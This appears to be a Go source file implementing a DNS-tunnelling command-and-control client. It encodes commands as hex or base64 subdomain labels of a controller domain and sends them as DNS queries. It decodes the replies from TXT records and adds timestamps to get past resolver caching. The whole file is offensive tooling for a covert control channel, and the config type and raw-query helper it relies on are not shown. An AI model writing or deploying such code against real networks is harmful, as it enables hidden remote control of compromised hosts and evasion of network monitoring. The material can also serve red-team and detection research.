package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

// DNSClient handles DNS-based C2 communication
type DNSClient struct {
	config *Config
}

// NewDNSClient creates a new DNS C2 client
func NewDNSClient(config *Config) *DNSClient {
	return &DNSClient{
		config: config,
	}
}

// encodeCommand encodes a command string for DNS transmission
func (c *DNSClient) encodeCommand(command string) string {
	var encoded string
	switch c.config.Encoding {
	case "hex":
		encoded = hex.EncodeToString([]byte(command))
	case "base64":
		encoded = base64.URLEncoding.EncodeToString([]byte(command))
	default:
		// Simple character replacement for basic commands
		encoded = strings.ReplaceAll(command, " ", "-")
	}

	return encoded
}

// decodeResponse decodes a DNS response back to readable format
func (c *DNSClient) decodeResponse(encoded string) (string, error) {
	// Try hex first (to match our encoding method)
	if decoded, err := hex.DecodeString(encoded); err == nil {
		return string(decoded), nil
	}

	// Try base64 as fallback
	missing := len(encoded) % 4
	if missing > 0 {
		encoded += strings.Repeat("=", 4-missing)
	}
	if decoded, err := base64.URLEncoding.DecodeString(encoded); err == nil {
		return string(decoded), nil
	}

	// If all decoding fails, return as-is with basic character replacement
	return strings.ReplaceAll(encoded, "-", " "), nil
}

// sendDNSQuery sends a command via DNS query
func (c *DNSClient) sendDNSQuery(command string) (string, error) {
	encodedCmd := c.encodeCommand(command)

	// Limit command length
	if len(encodedCmd) > c.config.MaxCommandLength {
		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
	}

	// Create DNS query with encoded command as subdomain
	// Split into 62-character chunks (even boundary) to comply with DNS label limits
	var labels []string
	for len(encodedCmd) > 0 {
		chunkSize := len(encodedCmd)
		if chunkSize > 62 {
			chunkSize = 62
		}
		// Ensure we split on even hex boundaries (each byte = 2 hex chars)
		if chunkSize%2 != 0 {
			chunkSize--
		}
		labels = append(labels, encodedCmd[:chunkSize])
		encodedCmd = encodedCmd[chunkSize:]
	}

	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), c.config.ServerDomain)

	var result string
	var err error

	// Determine query type
	var qtype uint16
	switch c.config.QueryType {
	case "A":
		qtype = 1
	case "TXT":
		qtype = 16
	case "AAAA":
		qtype = 28
	default:
		qtype = 1
	}

	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
		// Use raw DNS if custom server specified, otherwise use standard library
		if c.config.DNSServer != "" {
			// Use raw DNS query to specific server
			results, rawErr := c.sendRawDNSQuery(queryName, qtype, c.config.DNSServer)
			if rawErr == nil && len(results) > 0 {
				if c.config.QueryType == "TXT" {
					// Try to decode TXT records
					for _, txt := range results {
						decoded, decErr := c.decodeResponse(txt)
						if decErr == nil {
							result = decoded
						} else {
							result = fmt.Sprintf("Raw TXT: %s", txt)
						}
						break
					}
				} else {
					result = fmt.Sprintf("DNS Response: %v", results)
				}
				err = nil
				break
			}
			err = rawErr
		} else {
			// Use standard library DNS resolution
			switch c.config.QueryType {
			case "A":
				addrs, lookupErr := net.LookupHost(queryName)
				if lookupErr == nil && len(addrs) > 0 {
					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
					err = nil
					break
				}
				err = lookupErr

			case "TXT":
				txtRecords, lookupErr := net.LookupTXT(queryName)
				if lookupErr == nil && len(txtRecords) > 0 {
					// Try to decode TXT records
					for _, txt := range txtRecords {
						decoded, decErr := c.decodeResponse(txt)
						if decErr == nil {
							result = decoded
						} else {
							result = fmt.Sprintf("Raw TXT: %s", txt)
						}
						break
					}
					err = nil
					break
				}
				err = lookupErr

			default:
				addrs, lookupErr := net.LookupHost(queryName)
				if lookupErr == nil && len(addrs) > 0 {
					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
					err = nil
					break
				}
				err = lookupErr
			}
		}

		if err == nil {
			break
		}

		if attempt < c.config.RetryAttempts-1 {
			time.Sleep(time.Duration(attempt+1) * time.Second)
		}
	}

	if err != nil {
		return "", fmt.Errorf("DNS query failed after %d attempts: %v", c.config.RetryAttempts, err)
	}

	return result, nil
} // sendCommand is the main interface for sending commands
func (c *DNSClient) sendCommand(command string) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("empty command")
	}

	// Add timestamp to command to bypass DNS caching on recursive resolvers
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)

	return c.sendDNSQuery(commandWithTimestamp)
}
